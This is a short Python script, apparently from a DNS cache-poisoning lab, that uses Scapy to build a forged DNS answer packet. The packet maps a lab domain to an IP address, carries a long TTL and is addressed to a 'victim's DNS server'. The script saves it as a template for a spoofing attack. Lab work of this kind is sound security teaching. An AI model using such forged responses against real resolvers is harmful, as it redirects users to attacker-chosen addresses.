from scapy.all import *

# Create DNS packet template with Scapy
name = 'twysw.example.com'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.1.1.1', ttl=259200)
dns = DNS(id=0xAAAA, qr=1, qdcount=1, ancount=1, qd=Qdsec, an=Anssec)

ip = IP(dst='10.9.0.53', src='10.9.0.1')      # Attacker ip -> Victim's DNS server IP
udp = UDP(dport=53, sport=33333)              # UDP header
packet = ip / udp / dns                       # Full packet

with open('dns_template.bin', 'wb') as f:     # Save packet to file
    f.write(bytes(packet))
